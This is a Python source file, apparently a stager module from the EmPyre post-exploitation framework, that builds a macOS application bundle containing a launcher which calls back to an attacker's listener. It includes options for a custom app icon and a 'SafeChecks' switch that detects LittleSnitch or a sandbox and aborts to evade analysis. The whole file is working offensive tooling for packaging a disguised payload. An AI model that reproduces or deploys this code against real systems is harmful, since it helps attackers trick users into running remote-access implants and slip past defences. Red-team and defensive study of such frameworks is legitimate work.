from lib.common import helpers


class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Application',

            'Author': ['@xorrior'],

            'Description': ('Generates an EmPyre Application Bundle.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'AppIcon' : {
                'Description'   :   'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to the AppIcon.icns in the /data/misc/bundle-resources/ directory',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'path to output EmPyre application. The application will be saved to a zip file.',
                'Required'      :   True,
                'Value'         :   '/tmp/out.zip'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Architecture' : {
                'Description'   :   'Architecture to use. x86 or x64',
                'Required'      :   True,
                'Value'         :   'x64'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        savePath = self.options['OutFile']['Value']
        userAgent = self.options['UserAgent']['Value']
        SafeChecks = self.options['SafeChecks']['Value']
        arch = self.options['Architecture']['Value']
        icnsPath = self.options['AppIcon']['Value']
        

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  safechecks=SafeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:

            launcher = launcher.strip('echo').strip(' | python &').strip("\"")
            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath)
            return ApplicationZip
